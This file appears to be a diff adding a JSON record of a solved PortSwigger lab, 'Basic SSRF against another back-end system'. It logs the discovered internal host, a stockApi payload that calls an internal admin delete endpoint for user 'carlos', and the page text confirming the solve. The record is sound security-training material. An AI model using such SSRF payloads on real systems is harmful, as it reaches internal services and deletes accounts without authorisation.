@@ -1,0 +1,25 @@
+{
+  "lab": "Basic SSRF against another back-end system",
+  "officialUrl": "https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system",
+  "instanceBase": "https://0a4f00cc04c8f2e1d8c2542c009600ea.web-security-academy.net",
+  "discoveredBackend": "192.168.0.135:8080",
+  "scanHit": {
+    "i": 135,
+    "ok": true,
+    "status": 200,
+    "length": 6101,
+    "text": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Basic SSRF against another back-end system</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner is-solved'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Basic SSRF against another back-end ",
+    "stockApi": "http://192.168.0.135:8080/admin"
+  },
+  "deletePayload": "stockApi=http://192.168.0.135:8080/admin/delete?username=carlos",
+  "deleteResult": {
+    "ok": false,
+    "error": "AbortError: This operation was aborted",
+    "stockApi": "http://192.168.0.135:8080/admin/delete?username=carlos"
+  },
+  "solved": true,
+  "text": "Basic SSRF against another back-end system\nBack to lab description  \nLAB\n\nSolved\n\nCongratulations, you solved the lab!\nShare your skills! \n \n Continue learning\nHome\n\n|\n\nMy account\n3D Voice Assistants\n $46.26\nView details\nZZZZZZ Bed - Your New Home Office\n $77.46\nView details\nEggtastic, Fun, Food Eggcessories\n $87.11\nView details\nEco Boat\n $51.29\nView details\nMore Than Just Birdsong\n $10.93\nView details\nAll-in-One Typewriter\n $76.79\nView details\nCheshire Cat Grin\n $13.64\nView details\nSingle Use Food Hider\n $79.28\nView details\nInflatable Holiday Home\n $6.98\nView details\nFur Babies\n $60.95\nView details\nPicture Box\n $23.37\nView details\nGiant Pillow Thing\n $14.07\nView details\nSprout More Brain Power\n $32.10\nView details\nThere's No Place Like Gnome\n $32.07\nView details\nPet Experience Days\n $68.11\nView details\nReal Life Photoshopping\n $61.79\nView details\nSix Pack Beer Belt\n $73.90\nView details\nBBQ Suitcase\n $72.49\nView details\nHitch A Lift\n $5.16\nView details\nBabbage Web Spray\n $51.36\nView details",
+  "title": "Basic SSRF against another back-end system",
+  "url": "https://0a4f00cc04c8f2e1d8c2542c009600ea.web-security-academy.net/",
+  "evidenceScreenshot": "../screenshots/13-ssrf-backend-system-admin-delete-solved.png"
+}
